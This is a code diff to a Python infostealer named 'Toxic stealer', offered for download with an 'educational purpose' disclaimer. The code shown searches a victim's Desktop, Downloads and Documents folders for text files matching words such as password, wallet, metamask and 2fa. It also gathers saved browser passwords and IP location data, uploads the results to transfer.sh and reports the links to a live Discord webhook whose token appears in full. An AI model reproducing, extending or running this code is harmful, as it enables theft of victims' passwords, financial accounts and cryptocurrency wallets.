@@ -1,3 +1,15 @@
+""" Toxic stealer is a stealer graber thanks for downloading it
+hope you will like use don't 
+don't forget to make you report at my discord BKS#1958
+if you like you must take a look to spyse wich is a discord tool
+a lot of update are coming so stay connect (token etc)
+this stealer is only for educational purpose and must not be used as malicious way 
+I decline all responsability how you use it 
+Plague is down ! fuck world
+#I'm_pystyle
+"""
+
+
 from numbers import Number
 import requests, os, threading, requests,os,sys,shutil,json,base64,requests
 from shutil import rmtree, make_archive
@@ -27,8 +39,7 @@ except:
     os.system("pip install cryptography")
 
 
-Webhook_Here = "x"
-
+Webhook_Here = "https://discord.com/api/webhooks/1036195097806651462/IiWkvmx0oM1deBXxfw_6KikmznXjwmq2aSxppow5w36YYz9RUkiGl1N-JDhCLHA6o5_B"
 
 temp = os.getenv('TEMP')
 user = temp.split("\AppData")[0] 
@@ -37,15 +48,43 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
 
+words = ["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal",
+            "banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte""backup","secret"
+        ]
+
+path2search = [
+        user + r"\Desktop",
+        user + r"\Downloads",
+        user + r"\Documents",
+        user + r"\OneDrive\Desktop",
+        user + r"\OneDrive\Downloads",
+        user + r"\OneDrive\Documents",
+        user + r"\Bureau",
+        user + r"\Téléchargements",
+        user + r"\Documents",
+        user + r"\OneDrive\Bureau",
+        user + r"\OneDrive\Téléchargement",
+        user + r"\OneDrive\Documents",
+    ]
 
 headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
+url = {
+    'ip': 'http://ipinfo.io/json',
+    'transfer' : "https://transfer.sh/"
+}
+
+temp_file_path = {
+    'password' : temp + '\\' + f'Toxic Passwords.txt',
+    'vacum' : temp + '\\' + f'out\Toxic',
+    'repertory' : temp + '\\' + f'out'
+}
+
 def get_ip():
-    url = "http://ipinfo.io/json"
-    resp = requests.get(url)
+    resp = requests.get(url["ip"])
     json = resp.json()
     ip = json['ip']
     return ip
@@ -66,8 +105,7 @@ def global_info_pc():
     
     global loc, org, city, region, postal, time_zone, flag
     
-    url = "http://ipinfo.io/json"
-    resp = requests.get(url)
+    resp = requests.get(url['ip'])
     json = resp.json()
     city = json["city"]
     region = json["region"]
@@ -151,12 +189,12 @@ def file_vacum_embed(file_list,url_list):
                 "name": "toxic | file vacuum "
             },
             "footer": {
-                "text": "toxic",
+                "text": "@Toxic",
                 "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
             }
             }
         ],
-        "username": "@toxic",
+        "username": "Toxic",
         "avatar_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png",
         "attachments": []
             }
@@ -167,34 +205,15 @@ def file_vacum():
     name_list = []
        
     try:
-        os.mkdir(temp + '\\' + f'out')
+        os.mkdir(temp_file_path['repertory'])
     except:
-        shutil.rmtree(temp + '\\' + f'out')
-        os.mkdir(temp + '\\' + f'out')
+        shutil.rmtree(temp_file_path['repertory'])
+        os.mkdir(temp_file_path['repertory'])
     
     exts = ['txt']
     found_dir = 'output'
 
-    words = ["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal",
-            "banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte""backup","secret"
-        ]
-
-
-    path2search = [
-            user + r"\Desktop",
-            user + r"\Downloads",
-            user + r"\Documents",
-            user + r"\OneDrive\Desktop",
-            user + r"\OneDrive\Downloads",
-            user + r"\OneDrive\Documents",
-            user + r"\Bureau",
-            user + r"\Téléchargements",
-            user + r"\Documents",
-            user + r"\OneDrive\Bureau",
-            user + r"\OneDrive\Téléchargement",
-            user + r"\OneDrive\Documents",
-        ]
-
+    
 
     if path.isdir(found_dir):
         rmtree(found_dir)
@@ -225,7 +244,7 @@ def file_vacum():
                         name = '.'.join([name, *subnames])
                         name_list.append(name)
                         
-                        path_file = temp + '\\' + f'out\Toxic {name}.txt'    
+                        path_file = f'{temp_file_path["vacum"]} {name}.txt'
                             
                         with open(path_file, 'wb') as d:
                             d.write(content)
@@ -238,7 +257,7 @@ def upload_file_to_transfer_sh():
     global url_list
     global file_list
     
-    path = temp + '\\' + f'out'
+    path = temp_file_path["repertory"]
     url_list = []
     file_list = []
     
@@ -247,14 +266,14 @@ def upload_file_to_transfer_sh():
         name = file
         file_list.append(name)
         files = { "file": open(path + '\\' + name , 'rb')}
-        upload = requests.post("https://transfer.sh/",
+        upload = requests.post(url['transfer'],
                          files=files)
-        url = upload.text
+        url_ = upload.text
         
-        if url == 'Too Many Requests\n':
+        if url_ == 'Too Many Requests\n':
             continue
         
-        url_list.append(url)
+        url_list.append(url_)
 
 def password():
     APP_DATA_PATH= os.environ['LOCALAPPDATA']
@@ -380,7 +399,7 @@ def password():
 
         def save_passwords(self):
             intro = '<<<---------------- Toxic ------------------->>>\n'
-            with open(temp + '\\' + f'Toxic Passwords.txt','w',encoding='utf-8') as f:
+            with open(temp_file_path["password"],'w',encoding='utf-8') as f:
                 f.writelines(self.passwordList)
 
     if __name__=="__main__":
@@ -390,12 +409,12 @@ def password():
         
 def password_embed():
     
-    files = { "file": open(temp + '\\' + f'Toxic Passwords.txt', 'rb')}
-    upload = requests.post("https://transfer.sh/",
+    files = { "file": open(temp_file_path['password'], 'rb')}
+    upload = requests.post(url['transfer'],
                 files=files)
-    url = upload.text
+    url_ = upload.text
 
-    f = open(temp + '\\' + f'Toxic Passwords.txt', 'r')
+    f = open(temp_file_path['password'], 'r')
     text= f.readlines()
     NumberOfLine = len(text)
     NumberOfLine = NumberOfLine / 3
@@ -411,7 +430,7 @@ def password_embed():
                 },
                 {
                     "name": "Password Data",
-                    "value": f""":link: - {url}\n:key: **{NumberOfLine}**  - Password found """
+                    "value": f""":link: - {url_}\n:key: **{NumberOfLine}**  - Password found """
                 },
                 ],
             "author": {
@@ -419,7 +438,7 @@ def password_embed():
                 "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                 },
             "footer": {
-                "text": "Toxic",
+                "text": "@Toxic",
                 "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                 },
             "thumbnail": {
@@ -428,7 +447,7 @@ def password_embed():
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png",
-        "username": "@Toxic",
+        "username": "Toxic",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
